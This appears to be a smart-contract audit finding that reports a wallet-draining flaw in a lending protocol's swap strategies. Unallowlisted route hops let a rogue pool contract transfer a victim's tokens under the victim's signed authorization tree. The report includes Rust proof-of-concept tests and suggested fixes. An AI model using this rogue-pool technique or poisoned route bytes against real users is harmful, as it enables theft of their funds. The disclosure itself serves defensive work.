### Title
Unallowlisted swap-route hops let attacker-supplied pool code run under the caller's signed authorization tree and drain arbitrary wallet tokens - (File: contracts/controller/src/strategies/swap.rs)

### Summary
The herbivore advisory (CVE-2016-10665) is "trusted channel delivers attacker-substituted executable, which then runs with the victim's privileges". The XOXNO Lending analog is the strategy swap path: `multiply`, `swap_debt`, `swap_collateral`, and `repay_debt_with_collateral` accept caller-supplied `swap: Bytes` route payloads and hand them to the configured router, which invokes whatever pool/token addresses the payload names with no allowlist. Because the router calls those contracts while the account owner's `require_auth` tree is active, a malicious hop contract can execute `token.transfer(victim, attacker, amount)` on any token the victim holds, and an honest simulation records that transfer as a legitimate child of the victim's signed authorization tree. A crafted route delivered through the quote pipeline is the "downloaded executable": arbitrary attacker code substituted into a channel the user trusts.

### Finding Description
`swap_collateral` (and the other three strategy verbs) takes `swap: Bytes` from the caller and forwards it verbatim into `withdraw_and_swap_from_supply` → `swap_tokens`. [1](#0-0)  `swap_tokens` authorizes exactly one input transfer to the configured router and calls `router.execute_strategy(&controller, &amount_in, swap)` under a flash guard. [2](#0-1) 

The controller's settlement checks only bound the *routed* amount: they reject input-balance growth, cap spend at `amount_in`, and require positive measured output. [3](#0-2)  Nothing in the controller or the router restricts which contracts the route invokes. The protocol's own threat model states this explicitly: "The router calls the pool and token addresses its payload names and keeps no allowlist of them, so a route can put third-party code on the call stack below the caller's authorization... The loss is then the caller's wallet, not the routed amount, and neither the payload minimum nor the final risk gate bounds it." [4](#0-3) 

The harness proves the theft end-to-end: `UnlistedPoolRouter.execute_strategy` invokes `route.hop_pool` named by the payload, and `RogueHopPool.swap` calls `token.transfer(victim, attacker, amount)` on an unrelated wallet token. Simulation records the stolen transfer as a child of Alice's `swap_collateral` auth entry, and once that recorded tree is signed, Alice's wallet balance goes to zero while the attacker's receives `WALLET_BALANCE` — all inside a swap that still pays fair output and passes every controller check. [5](#0-4) [6](#0-5) 

### Impact Explanation
Theft of user funds. An unprivileged attacker deploys a rogue "pool" contract, embeds its address in route bytes delivered to a victim (via a compromised/malicious quote service, phishing front-end, or any channel that produces `swap` bytes), and when the victim signs the simulated transaction — whose authorization tree legitimately contains the rogue transfer as a child — the attacker's code moves the victim's entire balance of any chosen token to the attacker. The loss is unbounded by `amount_in`, `min_out`, or the final health-factor gate; it is the victim's whole wallet. The benign-looking swap still executes correctly (fair output, passing risk checks), so nothing on-chain signals the theft vector.

### Likelihood Explanation
Reachable by any unprivileged address through four public controller entrypoints (`multiply`, `swap_debt`, `swap_collateral`, `repay_debt_with_collateral`) and direct `execute_strategy` calls. The only prerequisite is getting the victim to sign a transaction built from poisoned route bytes — the same precondition as the herbivore HTTP substitution (a privileged position over delivered code). Because recording-mode simulation *produces* the tree the user signs, a user who inspects only the root call sees a normal `swap_collateral`; the protocol documentation itself acknowledges clients must decode the route and refuse extra children, confirming the base design does not prevent it. It is not a privileged, upgrade, or parameter issue; it is reachable production code.

### Recommendation
Constrain what route payloads can name, or decouple the victim's authority from hop execution:

1. Enforce a venue/pool allowlist at the router boundary (parallel to the existing Blend approval list per INV-STRAT-03) so `execute_strategy` rejects hops targeting unregistered pool/token addresses.
2. Alternatively, have the controller perform the swap with its own authorization only (it already is the `sender`), and forbid payload-named contracts from invoking `require_auth`-gated token transfers on the caller — e.g., require the router to invoke hops with direct invoker auth so a hop cannot attach children under the caller's tree.
3. Until then, enforce the documented client-side mitigation in SDK code: after simulation, walk the recorded authorization tree and reject any child invocation that is not the single expected input `transfer`.

### Proof of Concept
The repository already contains the executable PoC at `tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs`:

1. Alice supplies 10,000 USDC and holds `WALLET_BALANCE` of an unrelated token.
2. `UnlistedPoolRouter` (stand-in honoring the router ABI) is configured via `set_swap_aggregator`; it pulls `token_in`, calls `route.hop_pool.swap()`, and pays fair `min_out`. [7](#0-6) 
3. `RogueHopPool` stores a `(victim, wallet_token, attacker, amount)` plan in its constructor and, in `swap()`, executes `token.transfer(victim, attacker, amount)`. [8](#0-7) 
4. `simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry` shows recording mode produces an auth tree whose root is Alice's `swap_collateral` and whose child is `wallet_token.transfer(alice, attacker, WALLET_BALANCE)`; after the call, `wallet(alice) == 0` and `wallet(attacker) == WALLET_BALANCE` while Alice's ETH supply lands correctly.
5. `enforced_auth_moves_the_wallet_token_only_when_the_signed_tree_lists_the_rogue_transfer` shows the honest (root-only) tree rejects the theft, but the simulation-returned "poisoned" tree — what a wallet actually asks the victim to sign — authorizes it. [9](#0-8) 

Note: the threat-model document describes this exposure as a known property and prescribes a client-side mitigation [4](#0-3) , but no on-chain control prevents it, and it meets the "theft of user funds" acceptance bar reachable by an unprivileged attacker.

    pub fn execute_strategy(env: Env, sender: Address, total_in: i128, swap_xdr: Bytes) -> i128 {
        sender.require_auth();
        let route = RoutedSwap::from_xdr(&env, &swap_xdr).expect("route must decode");
        let router = env.current_contract_address();
        token::Client::new(&env, &route.token_in).transfer(&sender, &router, &total_in);
        let _: Val = env.invoke_contract(&route.hop_pool, &symbol_short!("swap"), vec![&env]);
        token::Client::new(&env, &route.token_out).transfer(&router, &sender, &route.min_out);
        route.min_out
    }

fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}

#[test]
fn enforced_auth_moves_the_wallet_token_only_when_the_signed_tree_lists_the_rogue_transfer() {
    let s = Scene::new();

    // Control: a pool that touches nothing passes with the honest root-only tree.
    let benign = s.route_through_pool_stealing(0);
    s.try_swap_with_signed_tree(&benign, &[])
        .expect("the honest tree authorizes an honest route");
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);

    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);

    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
}
